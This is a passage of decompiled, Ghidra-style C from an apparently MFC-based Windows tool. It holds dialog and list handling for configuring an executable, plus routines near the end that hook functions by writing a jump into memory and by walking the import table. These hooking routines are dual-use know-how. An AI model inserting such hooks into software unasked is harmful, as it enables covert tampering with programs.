  if ((*(int *)(*(int *)(this + 0x164) + -8) == 0) ||
     (*(int *)(*(int *)(unaff_EBP + -0x10) + -8) == 0)) {
    CWnd::MessageBoxA(this,&DAT_0040e330,(char *)0x0,0);
  }
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  LVar3 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  if (0 < LVar3) {
    do {
      _Str2 = *(uchar **)(this + 0x164);
      ppuVar4 = (uchar **)
                CListCtrl::GetItemText
                          ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x20,
                           *(undefined4 *)(unaff_EBP + -0x14));
      _Str1 = *ppuVar4;
      *(undefined *)(unaff_EBP + -4) = 1;
      iVar5 = _mbsicmp(_Str1,_Str2);
      if (iVar5 == 0) {
        *(undefined4 *)(unaff_EBP + -0x18) = *(undefined4 *)(unaff_EBP + -0x10);
        ppuVar4 = (uchar **)
                  CListCtrl::GetItemText
                            ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x1c,
                             *(undefined4 *)(unaff_EBP + -0x14));
        iVar5 = _mbsicmp(*ppuVar4,*(uchar **)(unaff_EBP + -0x18));
        CString::~CString((CString *)(unaff_EBP + -0x1c));
        if (iVar5 != 0) goto LAB_004021f5;
        bVar2 = true;
      }
      else {
LAB_004021f5:
        bVar2 = false;
      }
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x20));
      if (bVar2) {
        CWnd::MessageBoxA(this,&DAT_0040e318,(char *)0x0,0);
        goto LAB_00402261;
      }
      *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + -0x14) + 1;
      LVar3 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x14) < LVar3);
  }
  pcVar1 = *(char **)(this + 0x164);
  LVar3 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  iVar5 = CListCtrl::InsertItem((CListCtrl *)(this + 0xa0),1,LVar3,pcVar1,0,0,0,0);
  CListCtrl::SetItemText((CListCtrl *)(this + 0xa0),iVar5,1,*(char **)(unaff_EBP + -0x10));
LAB_00402261:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x10));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_0040228c(void)

{
  uchar *_Str2;
  LRESULT LVar1;
  uchar **ppuVar2;
  int iVar3;
  CWnd *this;
  int unaff_EBP;
  char *pcVar4;
  char *pcVar5;
  uint uVar6;
  
  FUN_0040a1d0();
  CString::CString((CString *)(unaff_EBP + -0x10));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  LVar1 = SendMessageA(*(HWND *)(this + 0xc0),0x1042,0,0);
  *(LRESULT *)(unaff_EBP + -0x18) = LVar1;
  if (LVar1 < 0) {
    uVar6 = 0;
    pcVar5 = (char *)0x0;
    pcVar4 = &DAT_0040e2e8;
LAB_0040240b:
    CWnd::MessageBoxA(this,pcVar4,pcVar5,uVar6);
  }
  else {
    CWnd::UpdateData(this,1);
    CWnd::GetWindowTextA(this + 0xe0,(CString *)(unaff_EBP + -0x10));
    if ((*(int *)(*(int *)(this + 0x164) + -8) == 0) ||
       (*(int *)(*(int *)(unaff_EBP + -0x10) + -8) == 0)) {
      CWnd::MessageBoxA(this,&DAT_0040e330,(char *)0x0,0);
    }
    *(undefined4 *)(unaff_EBP + -0x14) = 0;
    LVar1 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
    if (0 < LVar1) {
      do {
        if (*(int *)(unaff_EBP + -0x14) != *(int *)(unaff_EBP + -0x18)) {
          uVar6 = 0;
          *(undefined4 *)(unaff_EBP + -0x1c) = *(undefined4 *)(this + 0x164);
          ppuVar2 = (uchar **)
                    CListCtrl::GetItemText
                              ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x20,
                               *(int *)(unaff_EBP + -0x14));
          iVar3 = _mbsicmp(*ppuVar2,*(uchar **)(unaff_EBP + -0x1c));
          CString::~CString((CString *)(unaff_EBP + -0x20));
          if (iVar3 == 0) {
            _Str2 = *(uchar **)(unaff_EBP + -0x10);
            pcVar5 = (char *)0x1;
            ppuVar2 = (uchar **)
                      CListCtrl::GetItemText
                                ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x24,
                                 *(undefined4 *)(unaff_EBP + -0x14));
            iVar3 = _mbsicmp(*ppuVar2,_Str2);
            CString::~CString((CString *)(unaff_EBP + -0x24));
            if (iVar3 == 0) {
              pcVar4 = &DAT_0040e344;
              goto LAB_0040240b;
            }
          }
        }
        *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + -0x14) + 1;
        LVar1 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
      } while (*(int *)(unaff_EBP + -0x14) < LVar1);
    }
    CListCtrl::SetItemText
              ((CListCtrl *)(this + 0xa0),*(int *)(unaff_EBP + -0x18),0,*(char **)(this + 0x164));
    CListCtrl::SetItemText
              ((CListCtrl *)(this + 0xa0),*(int *)(unaff_EBP + -0x18),1,
               *(char **)(unaff_EBP + -0x10));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x10));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00402456(void)

{
  HWND pHVar1;
  char *pcVar2;
  CWnd *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  FUN_004031e6((undefined4 *)(unaff_EBP + -0x70));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::UpdateData(this,1);
  FUN_0040327b((void *)(unaff_EBP + -0x70),&DAT_0040e370,s___exe_0040e384);
  FUN_0040327b((void *)(unaff_EBP + -0x70),&DAT_0040e35c,&DAT_0040e36c);
  FUN_00403446((void *)(unaff_EBP + -0x70),s___exe_0040e384);
  FUN_00403478((void *)(unaff_EBP + -0x70),2);
  pHVar1 = FUN_00403485((LPOPENFILENAMEA)(unaff_EBP + -0x70));
  if (pHVar1 != (HWND)0x0) {
    pcVar2 = (char *)FUN_004034ce((void *)(unaff_EBP + -0x70),1);
    CString::operator=((CString *)(this + 0x174),pcVar2);
    CWnd::UpdateData(this,0);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00403228((void *)(unaff_EBP + -0x70));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_004024fb(void)

{
  HWND hWnd;
  LRESULT LVar1;
  ulong uVar2;
  CString *pCVar3;
  CWnd *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  if (*(int *)(*(int *)(unaff_EBP + 8) + 0x14) == 3) {
    CWnd::UpdateData(this,1);
    hWnd = *(HWND *)(this + 0x140);
    *(undefined4 *)(unaff_EBP + -0x10) = 0;
    LVar1 = SendMessageA(hWnd,0x146,0,0);
    if (0 < LVar1) {
      do {
        LVar1 = SendMessageA(*(HWND *)(this + 0x140),0x150,*(WPARAM *)(unaff_EBP + -0x10),0);
        *(LRESULT *)(unaff_EBP + -0x14) = LVar1;
        uVar2 = CListCtrl::GetItemData
                          ((CListCtrl *)(this + 0x60),*(int *)(*(int *)(unaff_EBP + 8) + 0xc));
        if (*(ulong *)(unaff_EBP + -0x14) == uVar2) {
          SendMessageA(*(HWND *)(this + 0x140),0x14e,*(WPARAM *)(unaff_EBP + -0x10),0);
          break;
        }
        *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
        LVar1 = SendMessageA(*(HWND *)(this + 0x140),0x146,0,0);
      } while (*(int *)(unaff_EBP + -0x10) < LVar1);
    }
    pCVar3 = (CString *)
             CListCtrl::GetItemText
                       ((CListCtrl *)(this + 0x60),unaff_EBP + 8,
                        *(undefined4 *)(*(int *)(unaff_EBP + 8) + 0xc));
    *(undefined4 *)(unaff_EBP + -4) = 0;
    CString::operator=((CString *)(this + 0x160),pCVar3);
    *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
    CString::~CString((CString *)(unaff_EBP + 8));
    CWnd::UpdateData(this,0);
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  **(undefined4 **)(unaff_EBP + 0xc) = 0;
  return;
}



void FUN_004025dc(void)

{
  HWND hWnd;
  LRESULT LVar1;
  uchar **ppuVar2;
  int iVar3;
  CString *pCVar4;
  CWnd *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  CString::CString((CString *)(unaff_EBP + -0x14));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (*(int *)(*(int *)(unaff_EBP + 8) + 0x14) == 3) {
    CWnd::UpdateData(this,1);
    hWnd = *(HWND *)(this + 0x100);
    *(undefined4 *)(unaff_EBP + -0x10) = 0;
    LVar1 = SendMessageA(hWnd,0x146,0,0);
    if (0 < LVar1) {
      do {
        CComboBox::GetLBText
                  ((CComboBox *)(this + 0xe0),*(int *)(unaff_EBP + -0x10),
                   (CString *)(unaff_EBP + -0x14));
        ppuVar2 = (uchar **)
                  CListCtrl::GetItemText
                            ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x18,
                             *(undefined4 *)(*(int *)(unaff_EBP + 8) + 0xc));
        iVar3 = _mbsicmp(*(uchar **)(unaff_EBP + -0x14),*ppuVar2);
        CString::~CString((CString *)(unaff_EBP + -0x18));
        if (iVar3 == 0) {
          SendMessageA(*(HWND *)(this + 0x100),0x14e,*(WPARAM *)(unaff_EBP + -0x10),0);
          break;
        }
        *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
        LVar1 = SendMessageA(*(HWND *)(this + 0x100),0x146,0,0);
      } while (*(int *)(unaff_EBP + -0x10) < LVar1);
    }
    pCVar4 = (CString *)
             CListCtrl::GetItemText
                       ((CListCtrl *)(this + 0xa0),unaff_EBP + 8,
                        *(undefined4 *)(*(int *)(unaff_EBP + 8) + 0xc));
    *(undefined *)(unaff_EBP + -4) = 1;
    CString::operator=((CString *)(this + 0x164),pCVar4);
    *(undefined *)(unaff_EBP + -4) = 0;
    CString::~CString((CString *)(unaff_EBP + 8));
    CWnd::UpdateData(this,0);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  **(undefined4 **)(unaff_EBP + 0xc) = 0;
  CString::~CString((CString *)(unaff_EBP + -0x14));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00402702(void)

{
  HWND pHVar1;
  LRESULT LVar2;
  ulong uVar3;
  void *pvVar4;
  CString *pCVar5;
  char *_Src;
  CWnd *this;
  int iVar6;
  int unaff_EBP;
  undefined4 *puVar7;
  void **ppvVar8;
  undefined4 *puVar9;
  
  FUN_0040a1d0();
  *(undefined *)(unaff_EBP + -0x5c) = 0;
  puVar7 = (undefined4 *)(unaff_EBP + -0x5b);
  for (iVar6 = 0xf; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined2 *)puVar7 = 0;
  *(undefined4 *)(unaff_EBP + -0x14) = 0;
  *(undefined *)((int)puVar7 + 2) = 0;
  CString::CString((CString *)(unaff_EBP + -0x18));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::UpdateData(this,1);
  pHVar1 = *(HWND *)(this + 0x80);
  *(undefined4 *)(unaff_EBP + -0x10) = 0;
  LVar2 = SendMessageA(pHVar1,0x1004,0,0);
  if (0 < LVar2) {
    do {
      uVar3 = CListCtrl::GetItemData((CListCtrl *)(this + 0x60),*(int *)(unaff_EBP + -0x10));
      if (uVar3 == 6) break;
      *(int *)(unaff_EBP + -0x10) = *(int *)(unaff_EBP + -0x10) + 1;
      LVar2 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x10) < LVar2);
  }
  LVar2 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if (*(int *)(unaff_EBP + -0x10) == LVar2) {
    iVar6 = CWnd::MessageBoxA(this,&DAT_0040e190,(char *)0x0,4);
    if (iVar6 == 7) goto LAB_00402926;
  }
  strcpy((char *)(unaff_EBP + -0x5c),s_UNINT_FILE_FLAG_0040e064);
  _strlwr((char *)(unaff_EBP + -0x5c));
  strcpy((char *)(unaff_EBP + -0x4c),*(char **)(this + 0x170));
  *(undefined4 *)(unaff_EBP + -0x3c) = *(undefined4 *)(this + 0x180);
  *(int *)(unaff_EBP + -0x34) = *(int *)(this + 0x17c) * 1000;
  *(int *)(unaff_EBP + -0x30) = *(int *)(this + 0x178) * 1000;
  *(int *)(unaff_EBP + -0x2c) = *(int *)(this + 0x168) << 10;
  *(int *)(unaff_EBP + -0x28) = *(int *)(this + 0x16c) << 10;
  *(undefined4 *)(unaff_EBP + -0x24) = *(undefined4 *)(this + 0x184);
  pHVar1 = *(HWND *)(this + 0x80);
  *(undefined2 *)(unaff_EBP + -0x20) = *(undefined2 *)(this + 0x188);
  LVar2 = SendMessageA(pHVar1,0x1004,0,0);
  *(LRESULT *)(unaff_EBP + -0x38) = LVar2;
  pvVar4 = operator_new(LVar2 * 0x18);
  *(void **)(unaff_EBP + -0x10) = pvVar4;
  memset(*(void **)(unaff_EBP + -0x10),0,*(int *)(unaff_EBP + -0x38) * 0x18);
  LVar2 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
  if (0 < LVar2) {
    ppvVar8 = (void **)(*(int *)(unaff_EBP + -0x10) + 0x10);
    do {
      pvVar4 = (void *)CListCtrl::GetItemData
                                 ((CListCtrl *)(this + 0x60),*(int *)(unaff_EBP + -0x14));
      ppvVar8[-4] = pvVar4;
      pCVar5 = (CString *)
               CListCtrl::GetItemText
                         ((CListCtrl *)(this + 0x60),unaff_EBP + -0x1c,
                          *(undefined4 *)(unaff_EBP + -0x14));
      *(undefined *)(unaff_EBP + -4) = 1;
      CString::operator=((CString *)(unaff_EBP + -0x18),pCVar5);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x1c));
      pvVar4 = (void *)(*(int *)(*(int *)(unaff_EBP + -0x18) + -8) + 1);
      ppvVar8[-3] = pvVar4;
      pvVar4 = operator_new((uint)pvVar4);
      *ppvVar8 = pvVar4;
      pvVar4 = ppvVar8[-3];
      _Src = CString::GetBuffer((CString *)(unaff_EBP + -0x18),0);
      memcpy(*ppvVar8,_Src,(size_t)pvVar4);
      *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + -0x14) + 1;
      ppvVar8 = ppvVar8 + 6;
      LVar2 = SendMessageA(*(HWND *)(this + 0x80),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x14) < LVar2);
  }
  FUN_0040504e(0x40ef74);
  DAT_0040f018 = *(undefined4 *)(unaff_EBP + -0x10);
  puVar7 = (undefined4 *)(unaff_EBP + -0x5c);
  puVar9 = &DAT_0040efd8;
  for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar9 = *puVar7;
    puVar7 = puVar7 + 1;
    puVar9 = puVar9 + 1;
  }
  FUN_00405978();
  FUN_004060cd(0x40ef74);
LAB_00402926:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x18));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00402941(void)

{
  byte *pbVar1;
  undefined4 extraout_ECX;
  CString *this;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(undefined2 *)(unaff_EBP + -0x24) = 0;
  *(undefined4 *)(unaff_EBP + -0x22) = 0;
  *(undefined4 *)(unaff_EBP + -0x1e) = 0;
  *(undefined4 *)(unaff_EBP + -0x1a) = 0;
  *(undefined4 *)(unaff_EBP + -0x14) = extraout_ECX;
  *(undefined2 *)(unaff_EBP + -0x16) = 0;
  CString::CString((CString *)(unaff_EBP + -0x10));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  GetLocalTime((LPSYSTEMTIME)(unaff_EBP + -0x24));
  pbVar1 = (byte *)FUN_00405b84();
  if (pbVar1 != (byte *)0x0) {
    CString::Format(this,(char *)(unaff_EBP + -0x10));
    OutputDebugStringA(*(LPCSTR *)(unaff_EBP + -0x10));
    Sleep(1000);
    if ((uint)*(ushort *)(unaff_EBP + -0x16) % 2 == 0) {
      OutputDebugStringA(&DAT_0040e38c);
    }
    else {
      FUN_00405ecf(pbVar1);
    }
  }
  CWnd::Default(*(CWnd **)(unaff_EBP + -0x14));
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x10));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void FUN_00402a0b(void)

{
  HWND pHVar1;
  undefined4 uVar2;
  bool bVar3;
  LRESULT LVar4;
  undefined3 extraout_var;
  undefined4 *puVar5;
  uint uVar6;
  void *pvVar7;
  char *pcVar8;
  CString *pCVar9;
  char *_Src;
  CWnd *this;
  int iVar10;
  CString *this_00;
  int unaff_EBP;
  char **ppcVar11;
  undefined4 *puVar12;
  size_t _Size;
  
  FUN_0040a1d0();
  *(undefined *)(unaff_EBP + -100) = 0;
  puVar5 = (undefined4 *)(unaff_EBP + -99);
  for (iVar10 = 0xf; iVar10 != 0; iVar10 = iVar10 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  CString::CString((CString *)(unaff_EBP + -0x10));
  pHVar1 = *(HWND *)(this + 0x20);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  KillTimer(pHVar1,1);
  CWnd::UpdateData(this,1);
  LVar4 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  if (LVar4 == 0) {
    if (*(int *)(this + 0x180) == 0) {
      pcVar8 = &DAT_0040e0e4;
LAB_00402ac2:
      CWnd::MessageBoxA(this,pcVar8,(char *)0x0,0);
      goto LAB_00402d14;
    }
  }
  else {
    bVar3 = FUN_004051ff(&DAT_0040ef74,DAT_0040f024,1);
    if ((CONCAT31(extraout_var,bVar3) == 0) && (DAT_0040f01c == 0)) {
      if (*(int *)(this + 0x180) == 0) {
        pcVar8 = &DAT_0040e074;
        goto LAB_00402ac2;
      }
      iVar10 = CWnd::MessageBoxA(this,&DAT_0040e0a0,(char *)0x0,4);
      if (iVar10 == 7) goto LAB_00402d14;
    }
  }
  strcpy((char *)(unaff_EBP + -100),s_UNINT_FILE_FLAG_0040e064);
  _strlwr((char *)(unaff_EBP + -100));
  strcpy((char *)(unaff_EBP + -0x54),*(char **)(this + 0x170));
  *(undefined4 *)(unaff_EBP + -0x44) = *(undefined4 *)(this + 0x180);
  *(int *)(unaff_EBP + -0x3c) = *(int *)(this + 0x17c) * 1000;
  *(int *)(unaff_EBP + -0x38) = *(int *)(this + 0x178) * 1000;
  *(int *)(unaff_EBP + -0x34) = *(int *)(this + 0x168) << 10;
  *(int *)(unaff_EBP + -0x30) = *(int *)(this + 0x16c) << 10;
  *(undefined4 *)(unaff_EBP + -0x2c) = *(undefined4 *)(this + 0x184);
  pHVar1 = *(HWND *)(this + 0xc0);
  *(undefined2 *)(unaff_EBP + -0x28) = *(undefined2 *)(this + 0x188);
  LVar4 = SendMessageA(pHVar1,0x1004,0,0);
  iVar10 = (*(int *)(this + 0x168) != 0) + 1 + LVar4;
  *(int *)(unaff_EBP + -0x40) = iVar10;
  puVar5 = (undefined4 *)operator_new(iVar10 * 0x18);
  *(undefined4 **)(unaff_EBP + -0x24) = puVar5;
  memset(puVar5,0,*(int *)(unaff_EBP + -0x40) * 0x18);
  *puVar5 = 8;
  uVar6 = *(int *)(*(int *)(this + 0x174) + -8) + 1;
  puVar5[1] = uVar6;
  pvVar7 = operator_new(uVar6);
  _Size = puVar5[1];
  puVar5[4] = pvVar7;
  pcVar8 = CString::GetBuffer((CString *)(this + 0x174),0);
  memcpy((void *)puVar5[4],pcVar8,_Size);
  LVar4 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
  if (0 < LVar4) {
    *(undefined4 *)(unaff_EBP + -0x14) = 0;
    ppcVar11 = (char **)(puVar5 + 10);
    do {
      uVar2 = *(undefined4 *)(unaff_EBP + -0x14);
      ppcVar11[-4] = (char *)0x2;
      pCVar9 = (CString *)CListCtrl::GetItemText((CListCtrl *)(this + 0xa0),unaff_EBP + -0x1c,uVar2)
      ;
      *(undefined *)(unaff_EBP + -4) = 1;
      CString::operator=((CString *)(unaff_EBP + -0x10),pCVar9);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x1c));
      CString::operator+=((CString *)(unaff_EBP + -0x10),&DAT_0040e060);
      pCVar9 = (CString *)
               CListCtrl::GetItemText
                         ((CListCtrl *)(this + 0xa0),unaff_EBP + -0x20,
                          *(undefined4 *)(unaff_EBP + -0x14));
      *(undefined *)(unaff_EBP + -4) = 2;
      CString::operator+=((CString *)(unaff_EBP + -0x10),pCVar9);
      *(undefined *)(unaff_EBP + -4) = 0;
      CString::~CString((CString *)(unaff_EBP + -0x20));
      pcVar8 = (char *)(*(int *)(*(int *)(unaff_EBP + -0x10) + -8) + 1);
      ppcVar11[-3] = pcVar8;
      pcVar8 = (char *)operator_new((uint)pcVar8);
      *ppcVar11 = pcVar8;
      pcVar8 = ppcVar11[-3];
      _Src = CString::GetBuffer((CString *)(unaff_EBP + -0x10),0);
      memcpy(*ppcVar11,_Src,(size_t)pcVar8);
      pcVar8 = strchr(*ppcVar11,0x7c);
      *pcVar8 = '\0';
      ppcVar11 = ppcVar11 + 6;
      *(int *)(unaff_EBP + -0x14) = *(int *)(unaff_EBP + -0x14) + 1;
      LVar4 = SendMessageA(*(HWND *)(this + 0xc0),0x1004,0,0);
    } while (*(int *)(unaff_EBP + -0x14) < LVar4);
  }
  FUN_0040504e(0x40ef74);
  DAT_0040f018 = *(undefined4 *)(unaff_EBP + -0x24);
  puVar5 = (undefined4 *)(unaff_EBP + -100);
  puVar12 = &DAT_0040efd8;
  for (iVar10 = 0x10; iVar10 != 0; iVar10 = iVar10 + -1) {
    *puVar12 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar12 = puVar12 + 1;
  }
  *(undefined4 *)(unaff_EBP + -0x18) = 0;
  FUN_0040616c(&DAT_0040ef74,(int *)(unaff_EBP + -0x18));
  CString::Format(this_00,(char *)(unaff_EBP + -0x10));
  CWnd::MessageBoxA(this,*(char **)(unaff_EBP + -0x10),(char *)0x0,0);
  FUN_0040504e(0x40ef74);
LAB_00402d14:
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  CString::~CString((CString *)(unaff_EBP + -0x10));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



void __fastcall FUN_00402d2f(CWnd *param_1)

{
  CPaintDC local_58 [84];
  
  CPaintDC::CPaintDC(local_58,param_1);
  CPaintDC::~CPaintDC(local_58);
  return;
}



CComboBox * __thiscall FUN_00402d64(void *this,byte param_1)

{
  CComboBox::~CComboBox((CComboBox *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CComboBox *)this;
}



CListCtrl * __thiscall FUN_00402d80(void *this,byte param_1)

{
  CListCtrl::~CListCtrl((CListCtrl *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CListCtrl *)this;
}



undefined4 * __fastcall FUN_00402d9c(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  memset(param_1 + 2,0,5);
  memset((void *)((int)param_1 + 0xd),0,5);
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[10] = 0;
  param_1[9] = 0;
  return param_1;
}



void FUN_00402dd9(void)

{
  return;
}



bool __thiscall FUN_00402dda(void *this,char *param_1,char *param_2,int param_3,int param_4)

{
  bool bVar1;
  size_t sVar2;
  int iVar3;
  HMODULE pHVar4;
  char *pcVar5;
  LPCSTR lpModuleName;
  
  if (*(int *)((int)this + 0x20) != 0) {
    return false;
  }
  if (param_1 == (char *)0x0) {
    return false;
  }
  sVar2 = strlen(param_1);
  if (sVar2 == 0) {
    return false;
  }
  if (param_2 == (char *)0x0) {
    return false;
  }
  sVar2 = strlen(param_2);
  if (sVar2 == 0) {
    return false;
  }
  if (param_3 == 0) {
    return false;
  }
  iVar3 = strcmp(param_1,&DAT_0040e3f4);
  if (iVar3 == 0) {
    lpModuleName = (LPCSTR)0x0;
  }
  else {
    lpModuleName = param_1;
    if (param_4 != 0) {
      pHVar4 = LoadLibraryA(param_1);
      goto LAB_00402e2e;
    }
  }
  pHVar4 = GetModuleHandleA(lpModuleName);
LAB_00402e2e:
  *(HMODULE *)((int)this + 0x14) = pHVar4;
  if (pHVar4 == (HMODULE)0x0) {
    return false;
  }
                    // WARNING: Load size is inaccurate
  pcVar5 = *this;
  if (param_1 != pcVar5) {
    if (pcVar5 != (char *)0x0) {
      free(pcVar5);
    }
    pcVar5 = _strdup(param_1);
    *(char **)this = pcVar5;
  }
  bVar1 = FUN_00402e7a(this,*(HMODULE *)((int)this + 0x14),param_2,param_3);
  return bVar1;
}



bool __thiscall FUN_00402e7a(void *this,HMODULE param_1,char *param_2,int param_3)

{
  size_t sVar1;
  FARPROC pFVar2;
  int iVar3;
  char *pcVar4;
  BOOL BVar5;
  int local_c;
  SIZE_T local_8;
  
  local_8 = 0;
  local_c = 0;
  if ((((*(int *)((int)this + 0x20) == 0) && (param_1 != (HMODULE)0x0)) && (param_2 != (char *)0x0))
     && ((sVar1 = strlen(param_2), sVar1 != 0 && (param_3 != 0)))) {
    if (*param_2 == '=') {
      pFVar2 = (FARPROC)atoi(param_2 + 1);
    }
    else if (*param_2 == '+') {
      iVar3 = atoi(param_2 + 1);
      pFVar2 = (FARPROC)((int)&param_1->unused + iVar3);
    }
    else {
      pFVar2 = GetProcAddress(param_1,param_2);
    }
    *(FARPROC *)((int)this + 0x18) = pFVar2;
    if (pFVar2 != (FARPROC)0x0) {
      pcVar4 = *(char **)((int)this + 4);
      *(HMODULE *)((int)this + 0x14) = param_1;
      if (param_2 != pcVar4) {
        if (pcVar4 != (char *)0x0) {
          free(pcVar4);
        }
        pcVar4 = _strdup(param_2);
        *(char **)((int)this + 4) = pcVar4;
      }
      BVar5 = ReadProcessMemory((HANDLE)0xffffffff,*(LPCVOID *)((int)this + 0x18),
                                (LPVOID)((int)this + 8),5,&local_8);
      if (BVar5 == 0) {
        GetLastError();
      }
      else {
        local_c = (param_3 - *(int *)((int)this + 0x18)) + -5;
        *(undefined *)((int)this + 0xd) = 0xe9;
        memcpy((void *)((int)this + 0xe),&local_c,4);
        BVar5 = WriteProcessMemory((HANDLE)0xffffffff,*(LPVOID *)((int)this + 0x18),
                                   (undefined *)((int)this + 0xd),5,&local_8);
        if (BVar5 == 0) {
          GetLastError();
          WriteProcessMemory((HANDLE)0xffffffff,*(LPVOID *)((int)this + 0x18),
                             (LPCVOID)((int)this + 8),5,&local_8);
        }
        else {
          *(undefined4 *)((int)this + 0x20) = 1;
          *(int *)((int)this + 0x1c) = param_3;
        }
      }
      return *(int *)((int)this + 0x20) != 0;
    }
    GetLastError();
  }
  return false;
}



bool __thiscall FUN_00402fa4(void *this,HMODULE param_1,char *param_2,char *param_3,char *param_4)

{
  uint uVar1;
  size_t sVar2;
  char *pcVar3;
  int *piVar4;
  int iVar5;
  char **lpAddress;
  uint *puVar6;
  PVOID *ppvVar7;
  _MEMORY_BASIC_INFORMATION local_28;
  DWORD local_c;
  undefined4 local_8;
  
  local_8 = 0;
  local_c = 0;
  if (*(int *)((int)this + 0x20) != 0) {
    if (param_4 != (char *)0x0) {
      return false;
    }
    if (*(int *)((int)this + 0x20) != 0) goto LAB_00402fd4;
  }
  if (param_4 == (char *)0x0) {
    return false;
  }
LAB_00402fd4:
  if (((((param_2 != (char *)0x0) && (sVar2 = strlen(param_2), sVar2 != 0)) &&
       (param_3 != (char *)0x0)) && (sVar2 = strlen(param_3), sVar2 != 0)) &&
     ((param_4 != (char *)0x0 || (*(int *)((int)this + 0x18) != 0)))) {
                    // WARNING: Load size is inaccurate
    pcVar3 = *this;
    if (param_2 != pcVar3) {
      if (pcVar3 != (char *)0x0) {
        free(pcVar3);
      }
      pcVar3 = _strdup(param_2);
      *(char **)this = pcVar3;
    }
    pcVar3 = *(char **)((int)this + 4);
    if (param_3 != pcVar3) {
      if (pcVar3 != (char *)0x0) {
        free(pcVar3);
      }
      pcVar3 = _strdup(param_3);
      *(char **)((int)this + 4) = pcVar3;
    }
    if (param_1 == (HMODULE)0x0) {
      param_1 = GetModuleHandleA((LPCSTR)0x0);
    }
    else {
      *(HMODULE *)((int)this + 0x14) = param_1;
    }
    piVar4 = (int *)ImageDirectoryEntryToData(param_1,1,1,&local_8);
    if (piVar4 != (int *)0x0) {
      while ((piVar4[3] != 0 &&
             (iVar5 = _stricmp((char *)((int)&param_1->unused + piVar4[3]),param_2), iVar5 != 0))) {
        piVar4 = piVar4 + 5;
      }
      if (piVar4[3] != 0) {
        puVar6 = (uint *)((int)&param_1->unused + *piVar4);
        lpAddress = (char **)((int)&param_1->unused + piVar4[4]);
        while( true ) {
          uVar1 = *puVar6;
          if (uVar1 == 0) goto LAB_00403146;
          if (((uVar1 & 0x80000000) != 0x80000000) &&
             (iVar5 = _stricmp(param_3,(char *)((int)&param_1->unused + uVar1 + 2)), iVar5 == 0))
          break;
          puVar6 = puVar6 + 1;
          lpAddress = lpAddress + 1;
        }
        local_28.BaseAddress = (LPVOID)0x0;
        ppvVar7 = &local_28.AllocationBase;
        for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
          *ppvVar7 = (PVOID)0x0;
